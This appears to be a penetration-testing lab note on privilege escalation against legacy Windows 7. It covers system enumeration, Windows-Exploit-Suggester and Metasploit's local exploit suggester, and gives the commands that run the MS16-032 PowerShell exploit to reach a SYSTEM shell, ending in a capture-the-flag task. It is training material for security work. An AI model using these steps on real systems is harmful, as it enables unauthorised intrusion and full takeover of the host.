# Windows 7

Windows 7 reached **End-of-Life (EOL) on January 14, 2020**, yet remains widely deployed in enterprise environments—especially in healthcare, legal, retail, and government sectors. Its lack of modern security mitigations and abundant unpatched vulnerabilities make it a common privilege escalation target.
## Security Feature Comparison

|Feature|Windows 7|Windows 10|
|---|---|---|
|Microsoft MFA Integration||✅|
|BitLocker|Partial|✅|
|Credential Guard||✅|
|Remote Credential Guard||✅|
|Device Guard (Code Integrity)||✅|
|AppLocker|Partial|✅|
|Windows Defender|Partial|✅|
|Control Flow Guard||✅|
## Context & Real-World Usage

According to NetMarketShare (Nov 2020), Windows 7 was still the **second most used OS worldwide**. Many embedded or specialized systems (e.g., POS, industrial software, and legal applications) still run on Windows 7 and cannot be easily upgraded due to budget or compatibility constraints.

> Always **evaluate business context** before issuing blanket recommendations. Some clients may need mitigation instead of removal.
## Enumeration with `systeminfo`

```cmd
systeminfo > win7-systeminfo.txt
```

This generates a full system fingerprint useful for local exploit matching.
## Using Windows-Exploit-Suggester
### Install Dependencies (Parrot/Kali)

```bash
wget https://files.pythonhosted.org/.../setuptools-2.0.tar.gz
tar -xf setuptools-2.0.tar.gz && cd setuptools-2.0/
sudo python2.7 setup.py install

wget https://files.pythonhosted.org/.../xlrd-1.0.0.tar.gz
tar -xf xlrd-1.0.0.tar.gz && cd xlrd-1.0.0/
sudo python2.7 setup.py install
```
### Update Vulnerability Database

```bash
python2.7 windows-exploit-suggester.py --update
```
### Run Against Captured Output

```bash
python2.7 windows-exploit-suggester.py --database <mssb.xls> --systeminfo win7-systeminfo.txt
```

You'll get a list of CVEs with links to:

- Exploit-DB PoCs    
- Metasploit modules
- CVSS risk ratings
## Notable Exploits Identified

| CVE / Bulletin | Description                                 |
| -------------- | ------------------------------------------- |
| **MS16-032**   | Secondary Logon Handle EoP (PowerShell PoC) |
| **MS16-135**   | NtSetWindowLongPtr Kernel EoP               |
| **MS16-075**   | RottenPotato / HotPotato (NTLM Reflection)  |
| **MS13-101**   | Kernel-Mode Driver EoP                      |
| **MS12-037**   | IE 8 ASLR/DEP Bypass                        |
## MS16-032 – PowerShell Exploit
### Execution

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

Output:

```text
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```
### Result

```cmd
whoami
nt authority\system
```
## Alternative Approach – Metasploit Local Exploit Suggester

If you’ve already obtained a Meterpreter shell:

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

This suggests usable LPE modules inside Metasploit, including for legacy OSes.
## Final Challenge

Gain access to a Windows 7 target host and:

1. Use enumeration techniques discussed above.
2. Exploit **at least one vulnerability** to elevate to `NT AUTHORITY\SYSTEM`.    
3. Locate and extract the `flag.txt` file on the Administrator's Desktop.

> Bonus: Try **multiple techniques** (Metasploit, PowerShell PoC, manual exploitation).
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #LegacyOS